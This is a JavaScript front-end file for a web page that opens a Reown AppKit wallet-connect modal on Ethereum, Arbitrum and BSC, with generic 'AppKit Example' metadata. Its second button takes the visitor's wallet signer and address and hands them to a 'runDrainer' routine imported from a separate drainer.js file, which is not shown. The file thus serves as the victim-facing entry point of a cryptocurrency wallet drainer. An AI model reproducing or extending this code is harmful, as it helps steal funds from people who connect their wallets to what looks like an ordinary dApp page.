import { createAppKit } from '@reown/appkit'
import { mainnet, arbitrum, bsc } from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'

const networks = [mainnet, arbitrum, bsc]

const wagmiAdapter = new WagmiAdapter({
  projectId,
  networks
})

const metadata = {
  name: 'sam',
  description: 'AppKit Example',
  url: 'https://reown.com/appkit',
  icons: ['https://assets.reown.com/reown-profile-pic.png']
}

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata,
  projectId,
  features: {
    analytics: true
  }
})

document.getElementById('open-connect-modal').addEventListener('click', () => modal.open())

document.getElementById('drainer-btn').addEventListener('click', async () => {
  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
    const signer = provider.getSigner()
    const address = await signer.getAddress()

    await runDrainer(provider, signer, address)
  } catch (e) {
    console.error("Ошибка в Drainer:", e)
  }
})
